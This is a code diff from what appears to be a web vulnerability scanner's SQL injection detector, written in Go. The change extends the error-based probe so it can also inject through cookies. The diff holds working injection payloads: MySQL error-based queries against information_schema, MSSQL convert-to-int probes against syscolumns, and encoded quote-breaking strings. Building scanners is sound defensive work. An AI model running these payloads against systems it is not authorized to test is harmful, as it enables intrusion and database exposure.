@@ -179,8 +179,8 @@ func encodeStringAsChar(str string, separator string) string {
 	return out
 }
 
-func (errsql *ClassSQLErrorMessages) TestInjection(index int, value string, confirmData []string) bool {
-	feature, err := errsql.LastJob.RequestByIndex(index, errsql.TargetUrl, []byte(value), nil)
+func (errsql *ClassSQLErrorMessages) TestInjection(index int, value string, confirmData []string, opt map[string]string) bool {
+	feature, err := errsql.LastJob.RequestByIndex(index, errsql.TargetUrl, []byte(value), opt)
 	errsql.trueFeatures = feature
 	if err != nil {
 		return false
@@ -197,7 +197,7 @@ func (errsql *ClassSQLErrorMessages) TestInjection(index int, value string, conf
 				markerEncodedMYSQL +
 				`) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)and` +
 				data
-			body_Feature, err := errsql.LastJob.RequestByIndex(index, errsql.TargetUrl, []byte(confirmValue), nil)
+			body_Feature, err := errsql.LastJob.RequestByIndex(index, errsql.TargetUrl, []byte(confirmValue), opt)
 			if err != nil {
 				return false
 			}
@@ -211,7 +211,7 @@ func (errsql *ClassSQLErrorMessages) TestInjection(index int, value string, conf
 				markerEncodedMYSQL +
 				`),floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))` +
 				data
-			body_Feature, err = errsql.LastJob.RequestByIndex(index, errsql.TargetUrl, []byte(confirmValue), nil)
+			body_Feature, err = errsql.LastJob.RequestByIndex(index, errsql.TargetUrl, []byte(confirmValue), opt)
 			if err != nil {
 				return false
 			}
@@ -224,7 +224,7 @@ func (errsql *ClassSQLErrorMessages) TestInjection(index int, value string, conf
 			} else {
 				confirmValue = data + `(select convert(int,` + markerEncodedMSSQL + `) FROM syscolumns)` + data
 			}
-			body_Feature, err = errsql.LastJob.RequestByIndex(index, errsql.TargetUrl, []byte(confirmValue), nil)
+			body_Feature, err = errsql.LastJob.RequestByIndex(index, errsql.TargetUrl, []byte(confirmValue), opt)
 			if err != nil {
 				return false
 			}
@@ -237,7 +237,7 @@ func (errsql *ClassSQLErrorMessages) TestInjection(index int, value string, conf
 			} else {
 				confirmValue = data + `convert(int,` + markerEncodedMSSQL + `)` + data
 			}
-			body_Feature, err = errsql.LastJob.RequestByIndex(index, errsql.TargetUrl, []byte(confirmValue), nil)
+			body_Feature, err = errsql.LastJob.RequestByIndex(index, errsql.TargetUrl, []byte(confirmValue), opt)
 			if err != nil {
 				return false
 			}
@@ -259,19 +259,23 @@ func (errsql *ClassSQLErrorMessages) testForError() bool {
 	return true
 }
 
-func (errsql *ClassSQLErrorMessages) startTesting() bool {
+func (errsql *ClassSQLErrorMessages) startTesting(Iscookieinject bool) bool {
+	opt := make(map[string]string)
+	if Iscookieinject {
+		opt["is_cookie_inject"] = "true"
+	}
 	if errsql.variations != nil {
 		for _, p := range errsql.variations.Params {
 			if errsql.testForError() {
 				return true
 			}
-			if errsql.TestInjection(p.Index, "1'\"", []string{"", "'", `"`}) {
+			if errsql.TestInjection(p.Index, "1'\"", []string{"", "'", `"`}, opt) {
 				return true
 			}
-			if errsql.TestInjection(p.Index, "1\x00\xc0\xa7\xc0\xa2%2527%2522", []string{"", "'", `"`}) {
+			if errsql.TestInjection(p.Index, "1\x00\xc0\xa7\xc0\xa2%2527%2522", []string{"", "'", `"`}, opt) {
 				return true
 			}
-			if errsql.TestInjection(p.Index, "@@"+util.RandStr(8), []string{"", "'", `"`}) {
+			if errsql.TestInjection(p.Index, "@@"+util.RandStr(8), []string{"", "'", `"`}, opt) {
 				return true
 			}
 		}
